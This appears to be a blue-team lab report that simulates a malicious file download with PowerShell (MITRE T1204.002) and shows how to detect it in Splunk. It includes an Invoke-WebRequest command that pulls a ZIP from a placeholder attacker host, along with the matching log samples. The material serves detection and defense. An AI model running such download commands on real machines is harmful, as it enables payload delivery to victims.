üîç Suspicious File Download & Execution Simulation Report

üìå Use Case

MITRE ATT\&CK Technique:

* Initial Access & Execution

  * `T1204.002` ‚Äì User Execution: Malicious File

---

üìù Scenario Summary

This simulation replicates a common initial access vector where an attacker uses a legitimate tool such as PowerShell to download and execute a malicious ZIP file. The scenario aims to test the visibility of suspicious download activity and script execution within a Windows environment using PowerShell and detect them via Splunk.

üß™ Attack Steps

Tools/Commands Used:

On Attacker Machine (Kali Linux):

```bash
echo "malicious payload inside" > fake_payload.txt
zip malicious.zip fake_payload.txt
python3 -m http.server 8080
```

On Victim Machine (Windows):

```powershell
powershell -Command "Invoke-WebRequest -Uri http://<Attacker-IP>:8080/malicious.zip -OutFile C:\Users\Public\malicious.zip"
```

* This uses PowerShell's `Invoke-WebRequest` to download a ZIP archive containing a fake payload.
* The file is dropped in a public user directory for potential execution.

üîé Detection Logic (Splunk SPL)

```spl
index=win_logs (EventCode=4688 OR EventCode=1 OR EventCode=4104)
| search CommandLine="*Invoke-WebRequest*" OR ScriptBlockText="*Invoke-WebRequest*"
| table _time, ComputerName, User, CommandLine, ScriptBlockText
```

üßæ Sample Logs / IoCs

```
CommandLine: powershell -Command "Invoke-WebRequest -Uri http://192.168.1.100:8080/malicious.zip -OutFile C:\Users\Public\malicious.zip"
ScriptBlockText: Invoke-WebRequest -Uri http://192.168.00.00:8080/malicious.zip
File Created: C:\Users\Public\malicious.zip
```

üîê Recommendations

* Block download and execution of files from untrusted sources using PowerShell.
* Enable and monitor ScriptBlockLogging and ModuleLogging via GPO.
* Restrict PowerShell usage to authorized users.
* Alert on use of LOLBins like `Invoke-WebRequest`, `certutil.exe`, or `bitsadmin.exe`.
